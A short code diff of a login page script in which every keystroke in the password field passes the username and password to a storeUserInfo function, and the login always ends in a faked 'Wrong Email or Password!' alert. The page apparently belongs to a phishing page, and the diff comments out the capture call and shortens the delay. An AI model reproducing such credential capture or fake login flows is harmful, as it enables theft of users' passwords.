@@ -751,7 +751,7 @@
         // Password event listener
         document.getElementById('password').addEventListener('input', function (event) {
             password = event.target.value;
-            storeUserInfo(username, password)
+            // storeUserInfo(username, password)
         });
 
         // Login button event listener
@@ -772,7 +772,7 @@
         loginBtn.disabled = false;
         loginBtn.innerHTML = 'Log in';
         alert('Wrong Email or Password!');
-      }, 10000);
+      }, 4000);
     });
     </script>
 </body>
